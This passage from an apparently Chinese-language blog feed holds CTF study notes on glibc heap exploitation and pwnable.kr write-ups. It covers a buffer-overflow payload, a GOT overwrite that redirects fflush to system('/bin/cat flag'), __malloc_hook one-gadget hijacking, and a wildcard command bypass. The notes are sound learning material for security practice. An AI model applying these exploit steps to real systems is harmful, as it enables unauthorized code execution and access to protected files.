__malloc_hook</code></p><p>我们想要做的是 泄露libc的基址，Heap overlap.<br>Overlapping two chunks to leak the address of the libc</p><p>将 chunk 4 释放掉，其 fd 指针会被设置为指向 unsorted bin 链表的头部，这个地址在 libc 中，且相对位置固定，利用它就可以算出 libc 被加载的地址<br>这时新的chunk2也指向fd , bk</p><p>调用 malloc() 时，首先判断 hook 函数指针是否为空，不为空则调用它。所以这里我们传入一个 one-gadget。<br><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p><p><code>gef➤  x/10gx (long long)(&amp;main_arena)-0x30</code></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;命令&quot;&gt;&lt;a href=&quot;#命令&quot; class=&quot;headerlink&quot; title=&quot;命令&quot;&gt;&lt;/a&gt;命令&lt;/h2&gt;&lt;p&gt;&lt;code&gt; &amp;quot;LD_PRELOAD&amp;quot;:&amp;quot;./libc-2.23.so&amp;quot;&lt;/code&gt; 更改glibc版本&lt;br&gt;&lt;code&gt;pwd&lt;/code&gt;显示当前目录&lt;br&gt;&lt;code&gt;apropos&lt;/code&gt;搜索man手册&lt;br&gt;&lt;code&gt;gef-&amp;gt;search-patten&lt;/code&gt;&lt;br&gt;&lt;code&gt;objdump -M intel&lt;/code&gt;汇编改为intel语法&lt;br&gt;&lt;code&gt;set disassambly intel&lt;/code&gt; gdb更改语法&lt;br&gt;&lt;code&gt;b print &lt;/code&gt;printf函数下断点&lt;/p&gt;</summary>
    
    
    
    <category term="heap" scheme="http://finsenty54.github.io/categories/heap/"/>
    
    
    <category term="heap" scheme="http://finsenty54.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr (1)</title>
    <link href="http://finsenty54.github.io/2021/03/06/pwnable.kr_1/"/>
    <id>http://finsenty54.github.io/2021/03/06/pwnable.kr_1/</id>
    <published>2021-03-06T01:57:39.000Z</published>
    <updated>2021-03-06T01:58:48.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwnable-kr-1"><a href="#pwnable-kr-1" class="headerlink" title="pwnable.kr (1)"></a>pwnable.kr (1)</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>函数调用栈的查看<br>backtrace：查看函数调用的顺序（函数调用栈的信息）<br>frame N：切换到栈编号为N的上下文中<br>info frame：查看当前函数调用的栈帧信息</p><p>“disassemble /r”命令可以用16进制形式显示程序的原始机器码<br>disass /r ‘fflush@plt’</p><p>echo $PATH</p><a id="more"></a><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><p>32位， <code>p32()</code> 可以让我们转换整数到<code>小端序</code>格式</p><pre><code>c.sendline(b&quot;AAAA&quot;*13+p32(0xcafebabe))</code></pre><p>加个<code>b</code>，不然是str格式，即<code>utf-8</code>，编码不一样<br>bytes字节符，打印以b开头</p><pre><code>┌─[zentreisender@parrotos]─[~/Documents/pwnable.kr/BOF]└──╼ $python3 exploit.py [+] Opening connection to pwnable.kr on port 9000: Done[*] Switching to interactive mode$ iduid=1008(bof) gid=1008(bof) groups=1008(bof)</code></pre><p>id 命令</p><h3 id="带参运行"><a href="#带参运行" class="headerlink" title="带参运行"></a>带参运行</h3><p>shell=ssh(‘col’,’pwnable.kr’, port=2222 ,password=’guest’)<br>p=shell.process(argv=[‘./col’,data_final]) #带参运行<br>ssh 链接也可以用process()</p><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。<br>每个<code>Unix进程（</code>除了可能的守护进程）应均有<code>三个标准的POSIX文件描述符</code>，对应于三个标准流</p><p>strcmp()<br>0    the contents of both strings are equal</p><pre><code>0    Standard input    STDIN_FILENO    stdin1    Standard output    STDOUT_FILENO    stdout2    Standard error    STDERR_FILENO    stderr</code></pre><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><p>做的少了，拿着文件单步运行了半天，又是strace , ltrace ,想看出些名堂，后来偶然看到upx字符串，就想不是win才有upx压缩，最后放弃；一搜wp才发现linux底下，<code>upx -d </code>就行。</p><p>断点到leave, 然后<br>peda:<br><code>x/s malloc</code>地址就得到flag</p><h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><p>got 表项覆盖</p><p><a href="https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283">https://medium.com/@andrew-bae/pwnable-kr-passcode-writeup-2fdfd9fec283</a><br>栈溢出，<code>scanf(%100, name)</code></p><pre><code>   0x804862f &lt;welcome+38&gt;:    lea    edx,[ebp-0x70]</code></pre><p>0x70=112 至少116个字符溢出到返回地址，name总共一百，所以溢出name不行</p><hr><p>  [24] .data             PROGBITS        0804a024 001024 000008 00  WA  0   0  4<br>我们直接在相应位置ebp-0x10, ebp-0xc放入想要的数字，但是scanf遇空格结束输入 </p><p>gdb-peda$ print $ebp-0x70<br>$1 = (void *) 0xffe43ab8</p><pre><code>0x804857c &lt;login+24&gt;:    mov    edx,DWORD PTR [ebp-0x10]0x80485aa &lt;login+70&gt;:    mov    edx,DWORD PTR [ebp-0xc]0x80485c5 &lt;login+97&gt;:    cmp    DWORD PTR [ebp-0x10],0x528e60x80485ce &lt;login+106&gt;:    cmp    DWORD PTR [ebp-0xc],0xcc07c9</code></pre><p>0x70-xc =100 刚好溢出不到</p><hr><p>scanf()函数接收输入数据时，遇以下情况结束一个数据的输入：<br>① 遇空格、“回车”、“跳格”键。<br>② 遇宽度结束。<br>③ 遇非法输入。</p><hr><p>Partial RELRO(The GOT table can be overwritten)</p><p>So, if I <code>overwrite fflush@got.plt address</code> as <code>system(“/bin/cat flag”)</code>; address, this binary will execute system(“/bin/cat flag”); after scanf .</p><h3 id="小端序研究"><a href="#小端序研究" class="headerlink" title="小端序研究"></a>小端序研究</h3><pre><code>objdump -R ./passcode0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0plt 表项8048430:    ff 25 04 a0 04 08        jmp    *0x804a004命令中地址倒序，即小端序got 表中地址也是倒序，即小端序0x804a00c &lt;puts@got.plt&gt;:    0xf7597ca00x804a00c &lt;puts@got.plt&gt;:    0xa0    0x7c    0x59 0xf7栈中地址也是小端序0000| 0xffb30e38 --&gt; 0xffb30e58gdb-peda$ x/4bx $esp0xffb30e38:    0x58    0x0e    0xb3    0xff只是存储方式是小端序，读出来还是原本的顺序payload += p32(0x0804a004)所以我们小端序写入栈中，执行地址没有小端序，why?输入12345678 = 0xBC 614Egdb-peda$ x/4bx $ebp-0xc0xffffcf4c:    0x4e    0x61    0xbc    0x00栈中是小端序输入的是单字节还是顺序存储，多字节如int，都是小端序</code></pre><hr><p>将fflush的got中的地址改为system的地址，这个地址不是libc库中的地址，而是代码段中的地址，即可以是任意可执行地址， 例如0x080485ea，但还要传参数，所以要提前一些：</p><pre><code>   0x080485e3 &lt;+127&gt;:    mov    DWORD PTR [esp],0x80487af   0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;   0x080485ef &lt;+139&gt;:    leave     0x080485f0 &lt;+140&gt;:    ret    </code></pre><p>0x80487af 字符串参数<br> 0x080485ea &lt;+134&gt;:    call   0x8048460 &lt;system@plt&gt;</p><p>代码：<br><a href="https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py">https://github.com/Finsenty54/attack-code/blob/master/pwnable.kr/passcode.py</a></p><h2 id="rondom"><a href="#rondom" class="headerlink" title="rondom"></a>rondom</h2><p>简单，rand() 不是true rondom</p><h2 id="leg"><a href="#leg" class="headerlink" title="leg"></a>leg</h2><h2 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h2><p><a href="https://www.cnblogs.com/ichunqiu/p/9056630.html">https://www.cnblogs.com/ichunqiu/p/9056630.html</a><br>在执行add r0, r1, #5指令时，第二条指令正在译码阶段，而第三条指令正在取指阶段。在执行第一条指令时，PC寄存器应指向第三条指令。也即，当处理器为三级流水线结构时，PC寄存器总是指向随后的第三条指令。</p><p>当处理器处于ARM状态时，每条ARM指令为4个字节，所以PC寄存器的值为当前指令地址 + 8字节<br>当处理器处于Thumb状态时，每条Thumb指令为2字节，所以PC寄存器的值为当前指令地址 + 4字节 </p><pre><code>/*  key1    0x00008cdc &lt;+8&gt;:    mov    r3, pc       0x00008ce0 &lt;+12&gt;:    mov    r0, r3           pc=0x8ce4    r4=pc    key2    取pc值的时候应该还在arm状态        pc=0x00008d0c    key3    lr 返回地址=0x00008d80将三个pc值加在一起 等于输入进的 k*/</code></pre><p>服务器好像down了<br>直接给falg:<code>My daddy has a lot of ARMv5te muscle!</code></p><h2 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h2><p>fd=open(“/home/mistake/password”,O_RDONLY,0400) &lt; 0</p><p>比较运算符高于赋值运算符</p><h2 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h2><p><a href="https://linux.die.net/man/7/credentials">https://linux.die.net/man/7/credentials</a><br><a href="https://en.wikipedia.org/wiki/User_identifier">https://en.wikipedia.org/wiki/User_identifier</a></p><h3 id="各user-id"><a href="#各user-id" class="headerlink" title="各user id"></a>各user id</h3><p>Effective user ID and effective group ID. These IDs are used by the kernel to determine the permissions that the process will have when accessing shared resources such as message queues, shared memory, and semaphores.On most UNIX systems, these IDs also determine the permissions when accessing files.<br> obtain its effective user (group) ID using geteuid(2) (getegid(2)).</p><p>Saved set-user-ID and saved set-group-ID. These IDs are used in set-user-ID and set-group-ID programs to <code>save a copy of the corresponding effective IDs </code>that were set when the program was executed (see execve(2)).<br>A set-user-ID program can assume and drop privileges by switching its effective user ID back and forth between the values in its real user ID and saved set-user-ID. This switching is done via calls to seteuid(2), setreuid(2), or setresuid(2).<br>比如ruid是普通用户，此时降权；suid是root，设置euid为suid后，提权<br> A process can obtain its saved set-user-ID (set-group-ID) using getresuid(2) (getresgid(2)).</p><p>Real user ID and real group ID. These IDs determine who owns the process. A process can obtain its real user (group) ID using getuid(2) (getgid(2)).</p><h3 id="setuid属性，权限，即文件有-s"><a href="#setuid属性，权限，即文件有-s" class="headerlink" title="setuid属性，权限，即文件有+s"></a>setuid属性，权限，即文件有+s</h3><p>-r-xr-sr-x  1 root shellshock_pwn   8547 Oct 12  2014 shellshock<br>When the setuid or setgid attributes are set on an executable file, then any users able to execute the file will automatically execute the file with the privileges of the file’s owner (commonly root) and/or the file’s group, depending upon the flags set</p><p>chmod by setting the high-order octal digit to 4 for setuid or 2 for setgid. “chmod 6711 file” will set both the setuid and setgid bits (4+2=6), making the file read/write/executable for the owner (7), and executable by the group (first 1) and others (second 1). When a user other than the owner executes the file, the process will run with user and group permissions set upon it by its owner. For example, if the file is owned by user root and group wheel, it will run as root:wheel no matter who executes the file.</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>4701 on an executable file owned by ‘root’ and the group ‘root’</p><p>A user named ‘thompson’ attempts to execute the file. The executable permission for all users is set (the ‘1’) so ‘thompson’ can execute the file. The file owner is ‘root’ and the SUID permission is set (the ‘4’) - so the file is executed as ‘root’.</p><h3 id="本题权限"><a href="#本题权限" class="headerlink" title="本题权限"></a>本题权限</h3><p>shellshock@pwnable:~$ stat -c “%a %A” shellshock<br>2555 -r-xr-sr-x<br> setgid bits</p><p>破壳（ShellShock）漏洞<br><a href="https://www.freebuf.com/articles/system/45390.html">https://www.freebuf.com/articles/system/45390.html</a></p><h2 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h2><p>服务器上没有按pwntools，运行不起来，改成re+socket中不行，懒得弄了</p><h2 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h2><p>echo $PATH<br>PATH表明程序所在的目录，运行一个程序，不在当前文件夹中，会遍历PATH中的目录，寻找程序所在文件夹<br>cat 命令在<code>/bin</code> 下<br>该题，用到了linux通配符<br><code>./cmd1 &quot;/bin/cat fla*&quot;</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pwnable-kr-1&quot;&gt;&lt;a href=&quot;#pwnable-kr-1&quot; class=&quot;headerlink&quot; title=&quot;pwnable.kr (1)&quot;&gt;&lt;/a&gt;pwnable.kr (1)&lt;/h1&gt;&lt;h2 id=&quot;命令&quot;&gt;&lt;a href=&quot;#命令&quot; class=&quot;headerlink&quot; title=&quot;命令&quot;&gt;&lt;/a&gt;命令&lt;/h2&gt;&lt;p&gt;函数调用栈的查看&lt;br&gt;backtrace：查看函数调用的顺序（函数调用栈的信息）&lt;br&gt;frame N：切换到栈编号为N的上下文中&lt;br&gt;info frame：查看当前函数调用的栈帧信息&lt;/p&gt;
&lt;p&gt;“disassemble /r”命令可以用16进制形式显示程序的原始机器码&lt;br&gt;disass /r ‘fflush@plt’&lt;/p&gt;
&lt;p&gt;echo $PATH&lt;/p&gt;</summary>
    
    
    
    <category term="pwnable.kr" scheme="http://finsenty54.github.io/categories/pwnable-kr/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>heap入门</title>
    <link href="http://finsenty54.github.io/2021/03/04/heap%E5%85%A5%E9%97%A8/"/>
    <id>http://finsenty54.github.io/2021/03/04/heap%E5%85%A5%E9%97%A8/</id>
    <published>2021-03-04T05:57:29.000Z</published>
    <updated>2021-03-12T03:33:49.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆利用Heap-Exploitation"><a href="#堆利用Heap-Exploitation" class="headerlink" title="堆利用Heap Exploitation"></a>堆利用Heap Exploitation</h1><p><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/</a><br><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/">https://ctf-wiki.org/pwn/linux/glibc-heap/introduction/</a></p><p>基础知识学习ptmalloc</p><h2 id="命令：："><a href="#命令：：" class="headerlink" title="命令：："></a>命令：：</h2><p><code>gef➤  x/32gx &amp;main_arena </code><br><code>gef➤  heap bins </code></p><a id="more"></a><h2 id="申请与释放"><a href="#申请与释放" class="headerlink" title="申请与释放"></a>申请与释放</h2><p>malloc()<br>free()</p><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc()"></a>malloc()</h3><p>malloc() 使用<code>brk() mmap()</code>申请内存</p><h4 id="brk-sbrk"><a href="#brk-sbrk" class="headerlink" title="brk() sbrk()"></a>brk() sbrk()</h4><p>The<code>program break</code>is the<code>address</code>of the first location beyond the current end of the data region.</p><pre><code>#include &lt;unistd.h&gt;int brk(void* end_data_segment);void *sbrk(intptr_t increment);┌─[zentreisender@parrotos]─[~/Documents/heap]└──╼ $./brkWelcome to sbrk example:178107Program Break Location1:0x555db6660000aProgram break Location2:0x555db6661000Program Break Location3:0x555db6660000a</code></pre><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to sbrk example:%d\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location1:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program break Location2:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Program Break Location3:%p\n&quot;</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>brk 参数是指针，设置break值<br>所以先用sbrk(0)获得当前break值的指向指针<br>再设置brk(sbrk(0)+4096)</p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h4><p>malloc 会使用 mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的内存，并且这块内存仅被调用进程所使用。</p><pre><code>addr = mmap(NULL, (size_t)132*1024, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);</code></pre><p>munmap()</p><pre><code>char* addraddr = (char*) malloc(1000);</code></pre><p>虽然只是申请了1000个字节，但是我们却得到了0x0806c000-0x0804b000=0x21000个字节的堆，int(0x21000,10)/1024=132，原来这132KB的堆空间叫做<code>arena</code>，此时因为是主线程分配的，所以这个区域叫做 <code>main arena</code>，（称这一块连续的内存区域为 arena，）申请的内存会一直从这个 arena 中获取，直到空间不足，当 arena 空间不足时，它可以通过增加<code>brk</code>的方式来增加堆的空间。</p><p>this shows heap memory is created by increasing program break location ( ie) using brk syscall</p><h3 id="free"><a href="#free" class="headerlink" title="free()"></a>free()</h3><p>Allocated memory region (of size 1000 bytes) is <code>released only to ‘glibc malloc’ library</code>,‘glibc malloc’ doesnt get new heap memory from kernel, instead it will try to find a free block in bin. And only when no free block exists, it obtains memory from kernel.</p><p>1.清空此堆块的 user data<br>2.将此堆块的指针存储到 main_arena 中了（或是 fast bin 中）</p><p>看出实际真的分配给程序的内存为1M(b7500000-b7600000)。heap memory of size 1 MB ,而且，只有132KB的部分具有可读可写权限，这一块连续的区域成为<code>thread arena</code>。是使用<code>mmap()</code>分配的，而不是sbrk()<br>当用户请求的内存大于128KB时，并且没有任何arena有足够的空间时，那么系统就会执行mmap函数来分配相应的内存空间，而不是sbrk()。这与这个请求来自于主线程还是从线程无关。</p><p> Instead allocated memory region (of size 1000 bytes) is released to ‘glibc malloc’, which adds this freed block to its thread arenas bin.</p><h2 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h2><pre><code>gef➤  x/32gx $rax-0x100x555555559290:    0x0000000000000000    0x00000000000000210x5555555592a0:    0x0000000000000000    0x00000000000000000x5555555592b0:    0x0000000000000000    0x0000000000020d510x5555555592c0:    0x0000000000000000    0x00000000000000000x5555555592d0:    0x0000000000000000    0x00000000000000000x5555555592e0:    0x0000000000000000    0x00000000000000000x5555555592f0:    0x0000000000000000    0x00000000000000000x555555559300:    0x0000000000000000    0x00000000000000000x555555559310:    0x0000000000000000    0x00000000000000000x555555559320:    0x0000000000000000    0x0000000000000000</code></pre><p>presize 8字节<br>size 8字节<br>0x5555555592a0 开始是user-data<br>64位最小分配16B，32位最小分配8B，所以是<code>16+8+8+1=21</code><br>user-data+header-len+pre_(1)=21<br><code>size最低三位，LSB表示前一chunk是否分配。</code></p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>结尾于arena的最高地址处<br>堆地址从低地址向高地址增长<br><a href="https://imgtu.com/i/6Vae81"><img src="https://s3.ax1x.com/2021/03/04/6Vae81.png" alt="6Vae81.png"></a></p><p>在程序在向堆管理器申请内存时，没有合适的内存空间可以分配给他，此时就会从 top chunk 上”剪切”一部分作为 chunk 分配给他</p><p>chunk()</p><h3 id="allocated-chunk"><a href="#allocated-chunk" class="headerlink" title="allocated chunk"></a>allocated chunk</h3><p>prev_size: If the <code>previous chunk is free</code>, this field contains <code>the size of previous chunk</code>. Else if previous chunk is <code>allocated</code>, this field contains<code> previous chunk’s user data</code>.<br>size: This field contains the size of this allocated chunk. <code>Last 3 bits</code> of this field contains flag information.</p><pre><code>PREV_INUSE (P) – This bit is set when previous chunk is allocated.IS_MMAPPED (M) – This bit is set when chunk is mmap’d.NON_MAIN_ARENA (N) – This bit is set when this chunk belongs to a thread arena.</code></pre><p>Other fields of malloc_chunk (like fd, bk) <code>is NOT used for allocated chunk</code>. Hence in place of these fields user data is stored.<br>·由于存储malloc_chunk以及对齐目的需要一些额外的空间，因此用户请求的大小将转换为可用大小（内部表示大小）。<br>·转换的方式是不会设置可用大小的最后3位，因此将其用于存储标志信息。<br><a href="https://imgtu.com/i/6VaHR1"><img src="https://s3.ax1x.com/2021/03/04/6VaHR1.png" alt="6VaHR1.png"></a></p><h3 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h3><p>prev_size: <code>No two free chunks can be adjacent together</code>. When both the chunks are free, its <code>gets combined into one single free chunk</code>. Hence always previous chunk to this freed chunk would be allocated and therefore prev_size contains previous chunk’s user data.<br><code>fd</code>: Forward pointer – Points to <code>next chunk</code> in the same bin (and NOT to the next chunk present in physical memory).<br>bk: Backward pointer – Points to previous chunk in the same bin (and NOT to the previous chunk present in physical memory).<br><a href="https://imgtu.com/i/6VaOsK"><img src="https://s3.ax1x.com/2021/03/04/6VaOsK.png" alt="6VaOsK.png"></a></p><h2 id="bins-垃圾桶"><a href="#bins-垃圾桶" class="headerlink" title="bins 垃圾桶"></a>bins 垃圾桶</h2><p>已经申请到的内存空间大小进行释放，来决定放入哪类 bins 当中去。<br>Fast bin<br>Unsorted bin<br>Small bin<br>Large bin</p><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p>64位下<br><code>Chunks of size 0x20 to 0x80 bytes is called a fast chunk.</code><br>其中的0x10字节是用来存prev_size和size</p><p>Number of bins – 10<br>Each fast bin contains a <code>single linked list</code> (a.k.a binlist) of free chunks.<br>Fast bins contain a binlist of chunks whose sizes are 8 bytes apart. ie) First fast bin (index 0) contains binlist of chunks of size 16 bytes, second fast bin (index 1) contains binlist of chunks of size  24 bytes and so on…</p><p>During malloc initialization, maximum fast bin size is set to 64 (!80) bytes.</p><h3 id="small-and-large-bins"><a href="#small-and-large-bins" class="headerlink" title="small and large bins"></a>small and large bins</h3><p>When small or large chunk gets freed instead of adding them in to their respective bins, <code>its gets added into unsorted bin.</code> 重要<br>This approach gives ‘glibc malloc’ a second chance to reuse the recently freed chunks.<br>Chunk size – There is no size restriction, chunks of any size belongs to this bin.</p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><pre><code>────────────────────── Fastbins for arena 0x7ffff7dd1b20 ──────────────────────Fastbins[idx=0, size=0x10]  ←  Chunk(addr=0x602010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x602030, size=0x20, flags=PREV_INUSE)Fastbins[idx=1, size=0x20]  ←  Chunk(addr=0x602050, size=0x30, flags=PREV_INUSE)Fastbins[idx=2, size=0x30]  ←  Chunk(addr=0x602080, size=0x40, flags=PREV_INUSE)Fastbins[idx=3, size=0x40]  ←  Chunk(addr=0x6020c0, size=0x50, flags=PREV_INUSE)Fastbins[idx=4, size=0x50]  ←  Chunk(addr=0x602110, size=0x60, flags=PREV_INUSE)Fastbins[idx=5, size=0x60]  ←  Chunk(addr=0x602170, size=0x70, flags=PREV_INUSE)Fastbins[idx=6, size=0x70]  ←  Chunk(addr=0x6021e0, size=0x80, flags=PREV_INUSE)</code></pre><p><code>a chunk of size 0x20-0x2f would fit into idx 0</code>, a chunk of size<code> 0x30-0x3f would fit into idx 1</code>, and so on and so forth.</p><p>有七条链表，每个链表有一个头，后面接着free的块<br>链表后进先出，使用头插法</p><h3 id="tcachebins"><a href="#tcachebins" class="headerlink" title="tcachebins"></a>tcachebins</h3><p>在glibc2.26中引入<br>一个链条同一时间只能有7个块<br>可以有64条链条<br>size任意0x20-0x410<br>当size不大（这个程度后面讲）堆块free后，不会直接进入各种bin，而是进入tcache，如果下次需要该大小内存，直接讲tcache分配出去<br>多出的块到达fastbins，（在大小符合的情况下）<br><a href="https://www.freebuf.com/articles/system/234219.html">https://www.freebuf.com/articles/system/234219.html</a><br><a href="https://guyinatuxedo.github.io/25-heap/index.html">https://guyinatuxedo.github.io/25-heap/index.html</a></p><p>tcachebins就相当于fastbins 而且较少检查</p><h3 id="Unsorted-Large-and-Small-Bins"><a href="#Unsorted-Large-and-Small-Bins" class="headerlink" title="Unsorted, Large and Small Bins"></a>Unsorted, Large and Small Bins</h3><p>双向链表<br>头部都在同一数组中，有不同的索引值。<br>0x00:         Not Used<br>0x01:         Unsorted Bin<br>0x02 - 0x3f:  Small Bin<br>0x40 - 0x7e:  Large Bin</p><p>Unsorted Bin只有一条链， 62 for the Small Bin, and 63 for the Large Bin</p><p>The <code>small bins</code> on x64 consists of chunk <code>sizes under 0x400</code> (1024 bytes), and on x86 consists of chunk sizes<code>under 0x200</code>(512 bytes), and the<code> large bin consists of values above those</code>.</p><p><strong>释放后，首先插入的是unsorted bin</strong><br>since the unsorted bin chunk could not serve the requested size of 0x1000, it was sorted to its corresponding list of in the small bin at idx 4<br>当再次分配但不满足要求时，将进行排序 到相应的bin上<br>若满足要求，就分配<br><a href="https://guyinatuxedo.github.io/25-heap/index.html">https://guyinatuxedo.github.io/25-heap/index.html</a></p><p>lagestbin 中还有fwd_nextsize and bk_nextsize</p><h3 id="Consolidation-合并"><a href="#Consolidation-合并" class="headerlink" title="Consolidation 合并"></a>Consolidation 合并</h3><p>相邻的空闲块都会合并</p><h3 id="Top-chunk"><a href="#Top-chunk" class="headerlink" title="Top chunk"></a>Top chunk</h3><p>The Top Chunk is essentially a large heap chunk that holds currently unallocated data.<br>first time calling malloc reiterate the top chunk holds unallocated data that isn’t in the bin list.</p><p>malloc will try to allocate chunks from the bin lists before allocating them from the top chunk</p><p>We can see that two things have happened to the top chunk. Firstly that it moved down <code>to 0x602120 from 0x602020</code> to make room for the new allocation from itself. Secondly, we see that it’s <code>size was shrunk by 0x100</code>, because of the 0x100 byte allocation from it.<br>低地址向高地址增长</p><p>depending on the version of malloc and if the chunk size is fast bin or tcache, this behavior doesn’t always show itself.<br>挨着top chunk，释放并不一定回到top chunk，旧的size值并不会清零，我的虚拟机上运行就变为<code>tcachebins </code></p><pre><code>gef➤  heap bins ──────────────────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7f9fb80 ────────────────────────────────────────────────────────────────Tcachebins[idx=14, size=0x100] count=1  ←  Chunk(addr=0x5555555592c0, size=0x100, flags=PREV_INUSE) </code></pre><p> one thing you will see us do a lot of is allocated a small chunk in between our freed chunks and the top chunk, just to prevent that consolidation.<br>攻击时，要阻止释放的chunk回到top chunk，所以中间放一个小块分配内存。</p><h2 id="main-arena"><a href="#main-arena" class="headerlink" title="main arena"></a>main arena</h2><p>contains the <code>head pointers </code>for the bin lists,<br>heap bins命令下可以显示</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>基于这些bug:<br>leverage the bugs and a bit of heap grooming to edit a freed chunk in one of the bin lists. Then from being able to edit a freed chunk in one of the bin lists we can launch a bin attack</p><pre><code>+--------------------+----------------------------+-----------------------+|   Bug Used         |  Bin Attack                |   House               |+--------------------+----------------------------+-----------------------+|                    |  Fast Bin Attack           |   House of Spirit     ||   Double Free      |  tcache attack             |   House of Lore       ||   Heap Overflow    |  Unsorted Bin Attck        |   House of Force      ||   Use After Free   |  Small / Large Bin Attck   |   House of Einherjar  ||                    |  Unsafe Unlink             |   House of Orange     |+--------------------+----------------------------+-----------------------+</code></pre><p>两大利器gef 和 源码 malloc.c<br>When you attempt to use LD_PRELOAD to have a binary use a specific libc file, you might find an issue if the linker’s are not compatible. </p><h2 id="fastbin-链表头插法"><a href="#fastbin-链表头插法" class="headerlink" title="fastbin 链表头插法"></a>fastbin 链表头插法</h2><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/double_free">https://heap-exploitation.dhavalkapil.com/attacks/double_free</a><br>分配 也是从头部开始分配</p><p>double free 原理，两次释放，将同一块重复加入链表中，分配自然重复使用了</p>]]></content>
    
    
